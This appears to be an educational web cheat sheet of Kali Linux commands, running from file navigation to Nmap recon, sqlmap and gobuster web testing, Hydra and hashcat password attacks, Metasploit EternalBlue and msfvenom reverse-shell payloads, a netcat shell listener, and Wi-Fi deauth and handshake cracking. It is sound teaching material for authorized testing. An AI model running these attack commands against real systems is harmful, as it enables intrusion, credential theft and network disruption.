01 · INTRODUCTION

🐉 What Is Kali Linux?

Kali Linux is a Debian-based Linux distribution designed specifically for digital forensics and penetration testing. Maintained by Offensive Security, it comes pre-installed with over 600 penetration testing tools — including Nmap, Metasploit, Burp Suite, Wireshark, John the Ripper, and Aircrack-ng. It's the de facto operating system for ethical hackers, red teams, and security researchers worldwide.

The power of Kali lies not just in its tools, but in its command-line interface. Almost every tool can be invoked, chained, and automated via the terminal. Mastering the essential Kali Linux commands is the foundation of your ethical hacking journey.

💡 Note: All commands in this guide are meant for Kali Linux (Debian-based). They also work on most Debian/Ubuntu systems with minor differences.
02 · NAVIGATION & FILES

📁 File System Navigation & Manipulation

These are the commands you'll use every single day. Mastering them makes you fast and confident in the terminal.

📍pwd

Print working directory — shows where you currently are in the file system.

📂ls

List directory contents. Use -la for detailed view including hidden files.

🚶cd

Change directory. cd .. goes up, cd ~ goes to home, cd - goes back.

📄cat

Concatenate and display file contents. Perfect for reading config files.

📝nano / vim

Text editors. nano is beginner-friendly, vim is powerful but has a learning curve.

📋cp

Copy files or directories. Use -r for recursive (directories).

🗑️mv / rm

Move/rename (mv) or delete (rm -rf) files and directories.

🔍find

Search for files by name, size, permissions, or date. Extremely powerful.

📌locate

Quick file search using a pre-built database. Run updatedb first.

📊tree

Display directory structure as a visual tree. Great for reconnaissance.

Common Examples

# List all files including hidden, with details ls -la # Find all .conf files in /etc find /etc -name "*.conf" 2>/dev/null # Search for files modified in last 24 hours find / -mtime -1 -type f 2>/dev/null # Copy an entire directory cp -r /source/dir /destination/ # Create nested directories in one shot mkdir -p project/{scans,logs,reports} # View file with line numbers cat -n /etc/passwd
03 · PERMISSIONS & USERS

🔐 File Permissions & User Management

Linux permissions are critical for security. Understanding chmod, chown, and user management is essential for privilege escalation and system administration.

Permission Basics

Each file has three permission types for three classes:

  • r (read) — value 4
  • w (write) — value 2
  • x (execute) — value 1
  • Classes: Owner (u), Group (g), Others (o)
OctalSymbolicMeaning
755rwxr-xr-xOwner full, others read/execute
644rw-r--r--Owner read/write, others read
700rwx------Only owner has access
777rwxrwxrwxEveryone full access (dangerous!)
600rw-------Private file (SSH keys)

Permission Commands

# Change file permissions chmod 755 script.sh chmod +x script.sh chmod -R 644 /var/www/html/ # Change ownership chown user:group file.txt chown -R www-data:www-data /var/www/ # View permissions stat file.txt ls -l file.txt # Special permissions chmod u+s /usr/bin/binary # SUID — runs as owner chmod g+s /shared/ # SGID chmod +t /tmp/ # Sticky bit

User Management

# Current user info whoami id who w # Switch user su - username sudo -i # root shell # Add / modify users useradd -m hacker passwd hacker usermod -aG sudo hacker # Delete user userdel -r hacker # View users cat /etc/passwd cut -d: -f1 /etc/passwd
⚠️ Warning: Commands like chmod 777, rm -rf, and dd can destroy your system. Always double-check before pressing Enter — especially as root.
04 · PROCESS MANAGEMENT

⚙️ Process Management & Monitoring

Knowing how to inspect and control processes is crucial — both for system administration and for post-exploitation (identifying what services are running).

📊ps

Show running processes. ps aux displays all processes with details.

📈top / htop

Real-time process monitor. htop is a prettier, more interactive version.

🔪kill

Terminate a process by PID. kill -9 PID forces termination.

🔍pgrep / pkill

Find/kill processes by name instead of PID. Easier than ps | grep.

📋jobs / bg / fg

Manage background and foreground jobs in the current shell.

⏱️nohup

Run a command immune to hangups — survives terminal close. Great for long scans.

Examples

# Show all processes ps aux # Find a specific process ps aux | grep apache # Kill by name pkill -f "python script.py" # Run scan in background, immune to hangup nohup nmap -sV 192.168.1.1 > scan.log 2>&1 & # Show what's listening on ports sudo lsof -i -P -n | grep LISTEN # Kill all processes by user pkill -u username
05 · NETWORK COMMANDS

🌐 Network Configuration & Diagnostics

Network commands are the lifeblood of penetration testing. You'll use these constantly for reconnaissance, pivoting, and troubleshooting.

📡ifconfig / ip

Show/configure network interfaces. ip a is the modern replacement.

🔗ping

Test connectivity to a host using ICMP echo requests.

🚪netstat / ss

Show network connections, routing tables, and listening ports.

🔎dig / nslookup

DNS lookup tools. dig is more powerful for reconnaissance.

🛣️traceroute

Trace the path packets take to a destination host.

🔧arp

View/manipulate the ARP cache — useful for local network discovery.

📥curl / wget

Download files or interact with web services from the command line.

🔌nc (netcat)

The "Swiss Army knife" of networking — for shells, file transfer, and ports.

Essential Examples

# Show all network interfaces ip a ifconfig # Show listening ports sudo ss -tulnp # DNS lookup dig example.com ANY dig +short example.com nslookup example.com 8.8.8.8 # Ping sweep a subnet for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i >/dev/null && echo "192.168.1.$i UP"; done # Download a file wget https://example.com/file.zip curl -O https://example.com/file.zip # Netcat listener (catch reverse shell) nc -lvnp 4444
06 · RECON & SCANNING

🔎 Reconnaissance & Scanning Tools

Reconnaissance is the first phase of any penetration test. These Kali tools help you map out targets, discover hosts, and identify services.

Nmap — The Network Mapper

The most important scanning tool in any hacker's toolkit.

# Basic ping scan (host discovery) nmap -sn 192.168.1.0/24 # Quick port scan (top 100 ports) nmap -F 192.168.1.1 # Full TCP port scan nmap -p- 192.168.1.1 # Service & version detection nmap -sV -sC 192.168.1.1 # Aggressive scan (OS, version, scripts, traceroute) nmap -A 192.168.1.1 # UDP scan sudo nmap -sU --top-ports 50 192.168.1.1 # Save output in all formats nmap -sV -oA scan_results 192.168.1.1

Other Recon Tools

🔍whois

Query domain registration info — owner, registrar, nameservers.

🌐dnsrecon

DNS enumeration — find subdomains, MX records, zone transfers.

📡theHarvester

Gather emails, subdomains, hosts from public sources.

🔗enum4linux

Enumerate Windows/Samba shares, users, and groups.

🌍amass

OWASP tool for in-depth attack surface mapping and asset discovery.

🚪masscan

Ultra-fast port scanner — can scan the entire internet in minutes.

# WHOIS lookup whois example.com # DNS enumeration dnsrecon -d example.com -t std # Email and subdomain harvest theHarvester -d example.com -b google -l 500 # SMB enumeration enum4linux -a 192.168.1.1 # Subdomain enumeration with amass amass enum -d example.com -o subs.txt
07 · WEB EXPLOITATION

🕸️ Web Application Testing

Web apps are the most common attack surface today. These Kali tools help you find directories, exploit SQL injection, and intercept HTTP traffic.

🗂️gobuster

Fast directory/file brute-forcer written in Go. Uses wordlists.

🕷️dirb

Classic web content scanner. Slower than gobuster but reliable.

🦈nikto

Web server scanner — finds dangerous files, misconfigs, outdated software.

💉sqlmap

Automatic SQL injection detection and exploitation.

🕵️wpscan

WordPress vulnerability scanner — plugins, themes, users.

🔒burpsuite

Web proxy for intercepting and modifying HTTP/S traffic.

# Directory brute-force with gobuster gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt # DNS subdomain brute-force gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt # Directory scan with dirb dirb http://target.com /usr/share/wordlists/dirb/big.txt # Nikto web server scan nikto -h http://target.com # SQL injection test sqlmap -u "http://target.com/page.php?id=1" --batch --dbs # WordPress scan wpscan --url http://target.com --enumerate u,vp
08 · PASSWORD ATTACKS

🔑 Password Cracking & Brute-Force

Password attacks are a core skill for penetration testers. These tools help you crack hashes, brute-force logins, and test password policies.

💀john

John the Ripper — the classic offline password cracker. Supports many hash types.

⚡hashcat

GPU-accelerated password cracker. Faster than John on modern hardware.

🐍hydra

Online brute-force tool — supports SSH, FTP, HTTP, RDP, and 50+ protocols.

📖crunch

Generate custom wordlists based on patterns and character sets.

🔓medusa

Parallel login brute-forcer — similar to Hydra, sometimes faster.

🔨cewl

Scrape a website to generate a custom wordlist for password guessing.

# Crack a hash with John john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt # Identify hash type hash-identifier # Crack with hashcat (NTLM example) hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # SSH brute-force with Hydra hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1 # HTTP POST form brute-force hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" # Generate wordlist with crunch crunch 8 8 abc123 -o wordlist.txt # Build wordlist from a website cewl http://target.com -w wordlist.txt
⚠️ Legal Warning: Password attacks against systems you don't own are illegal. Only use these tools on systems with explicit written authorization or in legal lab environments (TryHackMe, HackTheBox, etc.).
09 · EXPLOITATION

💥 Exploitation Frameworks

Once you've found vulnerabilities, exploitation frameworks help you turn them into real access.

Metasploit Framework

The world's most-used penetration testing framework. It provides exploits, payloads, encoders, and post-exploitation modules.

# Start Metasploit console msfconsole # Inside msfconsole: msf6 > search type:exploit platform:windows smb msf6 > use exploit/windows/smb/ms17_010_eternalblue msf6 > show options msf6 > set RHOSTS 192.168.1.1 msf6 > set LHOST 192.168.1.100 msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp msf6 > exploit # Generate standalone payload with msfvenom msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe # Linux reverse shell payload msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

Other Exploitation Tools

🔧searchsploit

Search Exploit-DB offline for known exploits matching software versions.

🐚msfvenom

Generate custom payloads for many platforms and formats.

💣beef

Browser Exploitation Framework — hooks browsers and runs client-side attacks.

🕸️setoolkit

Social Engineering Toolkit — phishing, credential harvesting, payloads.

# Search for exploits searchsploit apache 2.4.49 # Copy exploit to current directory searchsploit -m 50383 # Start Social Engineering Toolkit sudo setoolkit
10 · FORENSICS & ANALYSIS

🔬 Digital Forensics & Traffic Analysis

Forensics and packet analysis help you understand what happened — essential for incident response and post-exploitation.

🦈wireshark

GUI packet analyzer — the gold standard for network forensics.

📦tcpdump

Command-line packet capture. Works everywhere, even without GUI.

🔍strings

Extract readable strings from binary files — great for malware analysis.

📊binwalk

Analyze firmware images and extract embedded files.

🕵️foremost

Recover deleted files by file signature (carving).

🗂️volatility

Memory forensics framework — analyze RAM dumps.

# Capture packets with tcpdump sudo tcpdump -i eth0 -w capture.pcap # Read a pcap file sudo tcpdump -r capture.pcap -nn # Extract strings from a binary strings malware.bin | grep -i password # Analyze firmware binwalk firmware.bin # Recover deleted files foremost -i disk.img -o output/
11 · WIRELESS ATTACKS

📶 Wireless Network Attacks

Wireless networks are a common attack vector. These Kali tools help you audit Wi-Fi security.

📡aircrack-ng

Complete suite for Wi-Fi auditing — capture, crack, deauth.

📻airodump-ng

Capture Wi-Fi packets and list nearby networks.

📤aireplay-ng

Inject packets — deauth attacks, fake authentication.

🔨reaver

WPS PIN brute-force attack against routers.

# Enable monitor mode sudo airmon-ng start wlan0 # Scan for networks sudo airodump-ng wlan0mon # Capture handshake on specific channel sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon # Send deauth packets to force handshake sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon # Crack the handshake aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
12 · MISC & UTILITIES

🧰 Miscellaneous Utilities

Odds and ends that every hacker should know — text processing, file compression, and system info.

✂️grep / awk / sed

The text processing triad. Master these and you can parse anything.

📦tar / gzip / zip

Archive and compress files. tar -xzvf is your friend.

🔐openssl

Crypto toolkit — generate keys, encrypt files, test SSL/TLS.

📅date / cal

Show current date/time or calendar.

📝echo / printf

Print text to terminal or files.

📜history

Show previously executed commands. history | grep nmap.

🔢seq / bc

Generate number sequences / calculator. Great for scripting.

📋tee

Send output to both terminal and file at the same time.

🔤base64

Encode/decode Base64 — useful in payload crafting.

🌐xxd / hexdump

View files in hexadecimal format.

# Extract and decompress tar -xzvf archive.tar.gz unzip file.zip # Generate RSA key openssl genrsa -out private.key 2048 openssl rsa -in private.key -pubout -out public.key # Base64 encode/decode echo "hello" | base64 echo "aGVsbG8K" | base64 -d # Save and view output simultaneously nmap -sV 192.168.1.1 | tee scan.txt # Extract a specific column with awk cat /etc/passwd | awk -F: '{print $1, $3}'
13 · PACKAGE MANAGEMENT

📦 Installing & Managing Tools

Kali Linux uses Debian's apt package manager. Keep your tools updated and install new ones easily.

# Update package lists sudo apt update # Upgrade installed packages sudo apt upgrade -y sudo apt full-upgrade -y # Install a package sudo apt install nmap # Remove a package sudo apt remove toolname sudo apt autoremove # Search for a package apt search wireshark # Show package info apt show nmap # List installed packages dpkg -l | grep nmap
💡 Pro Tip: Kali includes a meta-package called kali-linux-everything that installs all tools. But it's huge (50GB+) — most users only need the default installation.

15 · CONCLUSION

🎓 Final Thoughts

Kali Linux commands are the foundation of your ethical hacking career. No matter how advanced the GUI tools become, the terminal remains the fastest, most powerful, and most scriptable way to get things done.

Start with the basics — navigation, files, permissions. Then move into network tools and scanning. Before you know it, you'll be chaining commands together like a pro.

Remember the golden rule: practice daily. Set up a lab (VirtualBox + Kali + Metasploitable), and try a new command every day. Within weeks, the terminal will feel like home.

Key Takeaways

  • Master navigation first — ls, cd, pwd, find.
  • Understand permissions — chmod, chown, and octal notation.
  • Learn Nmap deeply — it's the most important scanning tool.
  • Practice text processing — grep, awk, sed.
  • Automate everything — turn commands into Bash scripts.
  • Always stay legal — only test systems you own or have permission for.
🚀 Next Steps: Open a Kali VM, open a terminal, and start typing. The more you use these commands, the more they'll stick. Bookmark this page as your daily reference.

Happy hacking — ethically. 🐉
